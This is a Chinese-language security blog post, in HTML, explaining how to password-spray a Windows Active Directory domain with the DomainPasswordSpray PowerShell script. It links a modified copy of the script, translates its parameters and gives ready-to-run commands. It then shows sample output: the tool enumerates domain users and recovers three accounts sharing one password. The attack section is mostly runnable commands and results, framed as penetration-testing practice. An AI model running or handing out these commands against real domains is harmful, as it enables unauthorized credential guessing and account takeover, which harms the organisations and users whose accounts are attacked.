<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>Windows域渗透 - 用户密码枚举 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=post><div class=post-header><div class=meta><div class=date><span class=day>02</span>
<span class=rest>May 2018</span></div></div><div class=matter><h1 class=title>Windows域渗透 - 用户密码枚举</h1></div></div><h2 id=0x00-前言>0x00 前言</h2><p>在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？</p><h2 id=0x01-powershell>0x01 Powershell</h2><p>目前已经有很多Powershell集合脚本，用于域渗透简直舒爽</p><p>今天推荐一款名字叫<code>DomainPasswordSpray.ps1</code>的脚本，主要原理是先来抓取域用户账号，然后指定密码字典进行域认证。认证通过的就是密码正确的了。</p><p><img src=https://images.payloads.online/23ba8e1a-4f5f-11ec-bac7-00d861bf4abb.png alt=0x00></p><p><strong>GitHub项目地址：https://github.com/dafthack/DomainPasswordSpray</strong></p><p>由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。</p><p><img src=https://images.payloads.online/23f92d78-4f5f-11ec-a331-00d861bf4abb.png alt=0x01></p><p><strong>优化后的地址：http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt</strong></p><h2 id=0x02-参数说明>0x02 参数说明</h2><p>在代码的开头就已经有介绍了，我简单汉化一下。</p><p>描述：该模块主要用于从域中收集用户列表。</p><ul><li>参数： <code>Domain</code> 指定要测试的域名</li><li>参数： <code>RemoveDisabled</code> 尝试从用户列表删除禁用的账户</li><li>参数： <code>RemovePotentialLockouts</code> 删除锁定账户</li><li>参数： <code>UserList</code> 自定义用户列表(字典)。 如果未指定，这将自动从域中获取</li><li>参数： <code>Password</code> 指定单个密码进行口令测试</li><li>参数： <code>PasswordList</code> 指定一个密码字典</li><li>参数： <code>OutFile</code> 将结果保存到某个文件</li><li>参数： <code>Force</code> 当枚举出第一个后继续枚举，不询问</li></ul><h2 id=0x03-使用说明>0x03 使用说明</h2><p>使用例子：</p><p><code>C:\PS> Get-DomainUserList</code></p><p>该命令将从域中收集用户列表。</p><p><code>C:\PS> Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt</code></p><p>该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中</p><p><code>C:\PS> Invoke-DomainPasswordSpray -Password Winter2016</code></p><p>该命令将会从域环境中获取用户名，然后逐个以密码<code>Winter2016</code>进行认证枚举</p><p><code>C:\PS> Invoke-DomainPasswordSpray -UserList users.txt -Domain 域名 -PasswordList passlist.txt -OutFile sprayed-creds.txt</code></p><p>该命令将会从<code>users.txt</code>中提取用户名，与<code>passlist.txt</code>中的密码对照成一对口令，进行域认证枚举，登录成功的结果将会输出到<code>sprayed-creds.txt</code></p><h2 id=0x04-实战>0x04 实战</h2><h3 id=获取域环境中的用户列表>获取域环境中的用户列表</h3><p><strong>命令：</strong><code>C:\PS> Get-DomainUserList | Out-File -Encoding ascii userlist.txt</code></p><p><strong>输出：</strong></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>[*] Current domain is compatible with Fine-Grained Password Policy.
</span></span><span style=display:flex><span>[*] Now creating a list of users to spray...
</span></span><span style=display:flex><span>[*] There appears to be no lockout policy.
</span></span><span style=display:flex><span>[*] There are 8 total users found.
</span></span><span style=display:flex><span>[*] Created a userlist containing 8 users gathered from the current user&#39;s domain
</span></span></code></pre></td></tr></table></div></div><p>获取的用户名：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>C:\PS&gt; type .\userlist.txt
</span></span><span style=display:flex><span>Administrator
</span></span><span style=display:flex><span>Guest
</span></span><span style=display:flex><span>liyingzhe
</span></span><span style=display:flex><span>krbtgt
</span></span><span style=display:flex><span>Hack
</span></span><span style=display:flex><span>testPass
</span></span><span style=display:flex><span>webManager
</span></span><span style=display:flex><span>dba
</span></span></code></pre></td></tr></table></div></div><h3 id=密码枚举>密码枚举</h3><p><img src=https://images.payloads.online/243c3a28-4f5f-11ec-937a-00d861bf4abb.png alt=0x02></p><p><strong>命令：</strong> <code>C:\PS> Invoke-DomainPasswordSpray -Domain 域名 -Password w!23456 -OutFile sprayed-creds.txt</code></p><p><strong>输出：</strong></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>[*] Current domain is compatible with Fine-Grained Password Policy.
</span></span><span style=display:flex><span>[*] Now creating a list of users to spray...
</span></span><span style=display:flex><span>[*] There appears to be no lockout policy.
</span></span><span style=display:flex><span>[*] Removing disabled users from list.
</span></span><span style=display:flex><span>[*] There are 6 total users found.
</span></span><span style=display:flex><span>[*] Removing users within 1 attempt of locking out from list.
</span></span><span style=display:flex><span>[*] Created a userlist containing 6 users gathered from the current user&#39;s domain
</span></span><span style=display:flex><span>[*] Password spraying has begun. Current time is 18:45
</span></span><span style=display:flex><span>[*] This might take a while depending on the total number of users
</span></span><span style=display:flex><span>1 of 6 users tested2 of 6 users tested3 of 6 users tested[*] SUCCESS! User:testPass Password:w!23456
</span></span><span style=display:flex><span>4 of 6 users tested[*] SUCCESS! User:webManager Password:w!23456
</span></span><span style=display:flex><span>5 of 6 users tested[*] SUCCESS! User:dba Password:w!23456
</span></span><span style=display:flex><span>6 of 6 users tested[*] Password spraying is complete
</span></span><span style=display:flex><span>[*] Any passwords that were successfully sprayed have been output to sprayed-creds.txt
</span></span></code></pre></td></tr></table></div></div><p>枚举的结果：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>C:\PS &gt; type .\sprayed-creds.txt
</span></span><span style=display:flex><span>testPass:w!23456
</span></span><span style=display:flex><span>webManager:w!23456
</span></span><span style=display:flex><span>dba:w!23456
</span></span></code></pre></td></tr></table></div></div><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=light_protanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script></body></html>